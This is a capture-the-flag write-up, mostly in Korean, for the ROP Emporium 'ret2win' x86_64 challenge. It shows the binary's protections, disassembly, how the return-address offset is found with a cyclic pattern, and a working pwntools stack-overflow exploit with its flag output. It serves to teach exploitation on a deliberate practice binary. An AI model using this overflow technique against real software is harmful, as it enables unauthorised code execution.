# [ret2win](https://ropemporium.com/challenge/ret2win.html)
<br />

**Discription:**
> Locate a method that you want to call within the binary.
Call it by overwriting a saved return address on the stack.
> 
<br />
<br />

# x86_64

**Binary Protections:**
```yaml
[*] '/home/kali/pico/ret2win'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
<br />

```yaml
pwndbg> disass ret2win
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:     push   rbp
   0x0000000000400757 <+1>:     mov    rbp,rsp
   0x000000000040075a <+4>:     mov    edi,0x400926
   0x000000000040075f <+9>:     call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:    mov    edi,0x400943
   0x0000000000400769 <+19>:    call   0x400560 <system@plt>
   0x000000000040076e <+24>:    nop
   0x000000000040076f <+25>:    pop    rbp
   0x0000000000400770 <+26>:    ret
pwndbg> x/s 0x400943
0x400943:       "/bin/cat flag.txt"
```
`ret2win`은 `system`을 호출하고, 인자로 `"/bin/cat flag.txt"`를 사용하는 것을 알 수 있습니다. 

```yaml
$ python3 -q
>>> from pwn import *
>>> p = process("./ret2win")
[+] Starting local process './ret2win': pid 848
>>> p.sendline(cyclic(200, n=8))
>>> p.wait()
[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 848)
>>> Corefile("./core.848")
[+] Parsing corefile...: Done
[*] '/home/kali/pico/core.848'
    Arch:      amd64-64-little
    RIP:       0x400755
    RSP:       0x7fffadd7a4d8
    Exe:       '/home/kali/pico/ret2win' (0x400000)
    Fault:     0x6161616161616166
Corefile('/home/kali/pico/core.848')
>>> cyclic_find(0x6161616161616166, n=8)
40
```
오프셋은 40 입니다.

<br />

```python
from pwn import *

context.log_level = "error"
context.arch = "amd64"

p = process("./ret2win")

ret2win = 0x400756
str = 0x00400943

pay = flat({40:ret2win}, str)

p.sendline(pay)
p.interactive()
```
```bash
$ python3 test.py
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
$
```
